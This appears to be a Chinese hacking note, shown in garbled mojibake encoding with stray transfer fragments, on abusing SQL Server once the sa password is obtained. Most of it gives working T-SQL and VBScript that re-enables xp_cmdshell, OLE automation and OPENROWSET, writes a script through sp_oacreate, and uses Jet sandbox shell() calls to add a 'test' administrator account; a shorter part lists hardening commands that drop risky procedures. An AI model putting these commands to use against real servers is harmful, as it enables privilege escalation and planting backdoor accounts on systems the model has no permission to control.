+SQL Server ÒÑ·âæiÔª¼þ 'xp_cmdshell' µÄ ³ÌÐò 'sys.xp_cmdshell' Ö®´æÈ¡£¬Òòžé´ËÔª¼þÒÑ½›ÓÉ´ËËÅ·þÆ÷µÄ°²È«ÐÔ½M‘BêPé]¡£Ïµ½y¹ÜÀí†T¿ÉÒÔÊ¹ÓÃ sp_configure í†¢ÓÃ 'xp_cmdshell' µÄÊ¹ÓÃ¡£ÈçÐèÓÐêP†¢ÓÃ 'xp_cmdshell' µÄÔ”¼šÙYÓ£¬Õˆ…¢é†¡¶SQL Server ¾€ÉÏ…²•ø¡·ÖÐµÄ£¼½éÃæ…^½M‘B£¾(Surface Area Configuration)¡£
+ÓÃÏÂÃæÒ»¾ä»°¾Í¿ÉÒÔÁË½â¾öÁË¡£
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+¹Ø±ÕÒ»Ñù.Ö»ÊÇ½«ÉÏÃæµÄºóÃæµÄÄÇ¸ö"1"¸Ä³É"0"¾Í¿ÉÒÔÁË.
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;
+°´ÕÕÉÏÃæµÄ·½·¨ÊÔÁËÒ»ÏÂ£¬²»ÐÐ£¬ºÜÓôÃÆ£¬ÎÞÁÄÖÐ¾ÍÓÃÏÂÃæÃüÁî²é¿´×¢²á±íÖÐµÄÆô¶¯ÏîÄ¿£¬È»ºóÔÚ¿´£¬xp_cmdshell¾¹È»»Ö¸´³É¹¦ÁË.
+Exec xp_regenumvalues 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+ÔÚ»ñµÃSAÃÜÂëºó£¬ÍùÍùÒòÎª·þÎñÆ÷¹ÜÀíÕß»ò¡±Ç°ÈË¡±½«net.exeºÍnet1.exe±»ÏÞÖÆÊ¹ÓÃ£¬ÎÞ·¨Ìí¼Ó¹ÜÀíÔ±ÕËºÅ¡£ÎÒÃÇÖªµÀVBSÔÚ»î¶¯Ä¿Â¼(ADSI)²¿·ÖÓÐÒ»¸öwinnt¶ÔÏó£¬ÓÃÀ´¹ÜÀí±¾µØ×ÊÔ´£¬ÀûÓÃËü¿ÉÒÔ²»ÒÀ¿¿CMDµÈÃüÁî¾ÍÄÜÌí¼ÓÒ»¸ö¹ÜÀíÔ±£¬¾ßÌå´úÂëÈçÏÂ£º
+set wsnetwork=CreateObject("WSCRIPT.NETWORK")
+os="WinNT://"&wsnetwork.ComputerName
+Set ob=GetObject(os) 'µÃµ½adsi½Ó¿Ú,°ó¶¨
+Set oe=GetObject(os&"/Administrators,group") 'ÊôÐÔ,admin×é
+Set od=ob.Create("user","test") '½¨Á¢ÓÃ»§
+od.SetPassword "1234" 'ÉèÖÃÃÜÂë
+od.SetInfo '±£´æ
+Set of=GetObject(os&"/test",user) 'µÃµ½ÓÃ»§
+oe.add os&"/test"
+½«ÉÏÃæµÄ´úÂë±£´æÎª1.vbs£¬È»ºóÖ´ ÐÐ£¬ÃüÁîÎª¡°cscript 1.vbs¡±£¬ÕâÑù¾Í»áÔÚÏµÍ³Ìí¼ÓÒ»¸öÏµÍ³ÃûÎªtest£¬ÃÜÂëÎª1234µÄÓÃ»§¡£¾ßÌåÔÚ²éÑ¯·ÖÎöÆ÷Ö´ÐÐµÄ´úÂëÈçÏÂ£º
+declare @o int, @f int, @t int, @ret int
+exec sp_oacreate 'scripting.filesystemobject', @o out
+exec sp_oamethod @o, 'createtextfile', @f out, 'c:\1.vbs', 1
+exec @ret = sp_oamethod @f, 'writeline', NULL,'set wsnetwork=CreateObject
+("WSCRIPT.NETWORK")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'os="WinNT://"&wsnetwork.
+ComputerName'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set ob=GetObject(os)'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set oe=GetObject
+(os&"/Administrators,group")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set od=ob.Create
+("user","test")'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetPassword "1234"'
+exec @ret = sp_oamethod @f, 'writeline', NULL,'od.SetInfo '
+exec @ret = sp_oamethod @f, 'writeline', NULL,'Set of=GetObject
+(os&"/test",user) '
+exec @ret = sp_oamethod @f, 'writeline', NULL,'oe.add os&"/test"'
+
+Ö´ÐÐÍêÉÏÃæµÄÓï¾ä£¬ÔÙÖ´ÐÐÏÂÃæÕâÐÐ´úÂë£¬ÕâÐÐ´úÂëÒ»¶¨µ¥¶ÀÖ´ÐÐ£¬²»ÒªÓëÉÏÃæµÄ·ÅÔÚÒ»ÆðÖ´ÐÐ£¬·ñÔò»áÌáÊ¾¡°c:\1.vbsÕý±»ÁíÒ»¸ö³ÌÐòÔËÐÐ¡±¶øÎÞ·¨³É¹¦Ìí¼ÓÓÃ»§£º
+exec master..xp_cmdshell 'cscript c:\1.vbs'
+Èç¹ûÏµÍ³ÓÃ»§Ã»ÓÐÌí¼Ó³É¹¦£¬ÓÐ¿ÉÄÜÊÇÒòÎªÏµÍ³ÓÃ»§µÄÃÜÂë1234µÄÌ«¼òµ¥£¬²»·ûºÏ·þÎñÆ÷µÄ¸´ÔÓÃÜÂë²ßÂÔ£¬¿ÉÒÔ¿¼ÂÇÉèÖÃµÄ¸´ÔÓÐ©£¬È»ºóÔÙ²âÊÔÒ»ÏÂ¡£Ò²¿ÉÒÔÊ¹ÓÃecho½«´úÂëÐ´µ½1.vbsÖÐ£¬´úÂë¸ñÊ½Îª£º
+exec master..xp_cmdshell 'echo set wsnetwork=CreateObject("WSCRIPT.NETWORK")
+>>1.vbs'
+²»¹ý£¬²»ÖªµÀÎªÊ²Ã´ËùÓÐ´ø¡°&¡±×Ö·ûµÄÃüÁîÐÐ¶¼ÎÞ·¨Ð´Èë1.vbs£¬¸ÐÐËÈ¤µÄÅóÓÑ¿ÉÒÔ³¢ÊÔ½â¾öÒ»ÏÂ¡£
+Ê¹ÓÃjetÉ³ÅÌÄ£Ê½£¬¿ÉÒÔ½â¾öXP_cmdshellµÈ´æ´¢¹ý³ÌºÍÏà¹Ø¶¯Ì¬Á´½Ó¿â´øÀ´µÄ·³ÄÕ¡£³öÓÚ°²È«Ô­Òò£
+103f
+¬ÏµÍ³Ä¬ÈÏÇé¿öÏÂÉ³ÅÌÄ£Ê½Î´¿ªÆô£¬Õâ¾ÍÐèÒªxp_regwrite¿ªÆôÉ³ÅÌÄ£Ê½£º
+Exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0
+\Engines','SandBoxMode','REG_DWORD',1
+È»ºóÖ´ÐÐÉ³ÅÌÃüÁî£¬ÔÚÏµÍ³Ìí¼ÓÒ»¸öÓÃ»§ÃûÎªtest£¬ÃÜÂëÎª1234µÄÓÃ»§£º
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows
+\system32\ias\ias.mdb','select shell("cmd.exe /c net user test 1234 /add")')
+select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows
+\system32\ias\ias.mdb','select shell("cmd.exe /c net localgroup
+administrators test /add")')
+²»Í¬µÄ²Ù×÷ÏµÍ³£¬Â·¾¶Ò²²»Ò»Ñù£¬ÐèÒª¸ù¾ÝÇé¿ö×öÐÞ¸Ä£º
+NT/2K: c:\winnt\system32\
+XP/2003: c:\windows\system32\
+ÁíÍâMicrosoft SQL Server2005ÔÚÄ¬ÈÏÇé¿öÏÂ£¬Ò»Ð©´æ´¢¹ý³ÌÊÇ¹Ø±Õ×ÅµÄ£¬ÐèÒªÃüÁî ´ò¿ª£º
+¿ªÆôXP_cmdshell£º
+EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure
+'xp_cmdshell', 1;RECONFIGURE;
+¿ªÆô'OPENROWSET'£º
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure
+'Ad Hoc Distributed Queries',1;RECONFIGURE;
+¿ªÆô'sp_oacreate':
+exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure
+'Ole Automation Procedures',1;RECONFIGURE;
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+É¾³ýsqlÎ£ÏÕ´æ´¢£º 
+DROP PROCEDURE sp_makewebtask 
+exec master..sp_dropextendedproc xp_cmdshell 
+exec master..sp_dropextendedproc xp_dirtree 
+exec master..sp_dropextendedproc xp_fileexist 
+exec master..sp_dropextendedproc xp_terminate_process 
+exec master..sp_dropextendedproc sp_oamethod 
+exec master..sp_dropextendedproc sp_oacreate 
+exec master..sp_dropextendedproc xp_regaddmultistring 
+exec master..sp_dropextendedproc xp_regdeletekey 
+exec master..sp_dropextendedproc xp_regdeletevalue 
+exec master..sp_dropextendedproc xp_regenumkeys 
+exec master..sp_dropextendedproc xp_regenumvalues 
+exec master..sp_dropextendedproc sp_add_job 
+exec master..sp_dropextendedproc sp_addtask 
+exec master..sp_dropextendedproc xp_regread 
+exec master..sp_dropextendedproc xp_regwrite 
+exec master..sp_dropextendedproc xp_readwebtask 
+exec master..sp_dropextendedproc xp_makewebtask 
+exec master..sp_dropextendedproc xp_regremovemultistring 
+exec master..sp_dropextendedproc sp_OACreate 
+DROP PROCEDURE sp_addextendedproc 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+»Ö¸´À©Õ¹´æ´¢¹ý³ÌµÄ°ì·¨ 
+ÏÈ»Ö¸´sp_addextendedproc£¬Óï¾äÈçÏÂ£º 
+µÚÒ»£º
+create procedure sp_addextendedproc --- 1996/08/30 20:13 
+@functname nvarchar(517),/* (owner.)name of function to call */ @dllname varchar(255)/* name of DLL containing function */ as 
+set implicit_transactions off 
+if @@trancount > 0   
+begin 
+raiserror(15002,-1,-1,'sp_addextendedproc')   
+return (1)   
+end 
+dbcc addextendedproc( @functname, @dllname)   
+return (0) -- sp_addextendedproc 
+GO 
+µÚ¶þ£º 
+use master   
+exec sp_addextendedproc xp_cmdshell,'xp_cmdshell.dll'   
+exec sp_addextendedproc xp_dirtree,'xpstar.dll'   
+exec sp_addextendedproc xp_enumgroups,'xplog70.dll'   
+exec sp_addextendedproc xp_fixeddrives,'xpstar.dll'   
+exec sp_addextendedproc xp_loginconfig,'xplog70.dll'   
+exec sp_addextendedproc xp_enumerrorlogs,'xpstar.dll'   
+exec sp_addextendedproc xp_getfiledetails,'xpstar.dll'   
+exec sp_addextendedproc sp_OACreate,'odsole70.dll'   
+exec sp_addextendedproc sp_OADestroy,'odsole70.dll'   
+exec sp_addextendedpr oc sp_OAGetErrorInfo,'odsole70.dll'   
+exec sp_addextendedproc sp_OAGetProperty,'odsole70.dll'   
+exec sp_addextendedproc sp_OAMethod,'odsole70.dll'   
+exec sp_addextendedproc sp_OASetProperty,'odsole70.dll'   
+exec sp_addextendedproc sp_OAStop,'odsole70.dll'   
+exec sp_addextendedproc xp_regaddmultistring,'xpstar.dll'   
+exec sp_addextendedproc xp_regdeletekey,'xpstar.dll'   
+exec sp_addextendedproc xp_regdeletevalue,'xpstar.dll'   
+exec sp_addextendedproc xp_regenumvalues,'xpstar.dll'   
+exec sp_addextendedproc xp_regread,'xpstar.dll'   
+exec sp_addextendedproc xp_regremovemultistring,'xpstar.dll'   
+exec sp_addextendedproc xp_regwrite,'xpstar.dll'   
+exec sp_addextendedproc xp_availablemedia,'xpstar.dll'
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡
+666
+ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+É¾³ýÀ©Õ¹´æ´¢¹ý¹ý³Ìxp_cmdshellµÄÓï¾ä: 
+exec sp_dropextendedproc 'xp_cmdshell' 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+»Ö¸´cmdshellµÄsqlÓï¾ä 
+exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+¿ªÆôcmdshellµÄsqlÓï¾ä 
+exec sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll' 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+ÅÐ¶Ï´æ´¢À©Õ¹ÊÇ·ñ´æÔÚ 
+select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 
+·µ»Ø½á¹ûÎª1¾Íok 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+»Ö¸´xp_cmdshell 
+exec master.dbo.addextendedproc 'xp_cmdshell','xplog70.dll';select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell' 
+·µ»Ø½á¹ûÎª1¾Íok 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+·ñÔòÉÏ´«xplog7.0.dll 
+exec master.dbo.addextendedproc 'xp_cmdshell','c:\winnt\system32\xplog70.dll' 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+¶ÂÉÏcmdshellµÄsqlÓï¾ä 
+sp_dropextendedproc "xp_cmdshell 
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+Ò».¸ü¸Äsa¿ÚÁî·½·¨£º
+ÓÃsql×ÛºÏÀûÓÃ¹¤¾ßÁ¬½Óºó£¬Ö´ÐÐÃüÁî£º
+exec sp_password NULL,'ÐÂÃÜÂë','sa'
+(ÌáÊ¾£ºÉ÷ÓÃ!)
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+¶þ.¼òµ¥ÐÞ²¹saÈõ¿ÚÁî.
+·½·¨1:²éÑ¯·ÖÀëÆ÷Á¬½ÓºóÖ´ÐÐ£º
+if exists (select * from 
+dbo.sysobjects where id = object_id(N'[dbo].[xp_cmdshell]') and 
+OBJECTPROPERTY(id, N'IsExtendedProc') = 1)
+exec sp_dropextendedproc N'[dbo].[xp_cmdshell]'
+GO
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+·½·¨2:²éÑ¯·ÖÀëÆ÷Á¬½Óºó
+µÚÒ»²½Ö´ÐÐ£ºuse master 
+µÚ¶þ²½Ö´ÐÐ£ºsp_dropextendedproc 'xp_cmdshell' 
+È»ºó°´F5¼üÃüÁîÖ´ÐÐÍê±Ï
+¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô¡ô
+5
+¡ô
+ 
+0
+
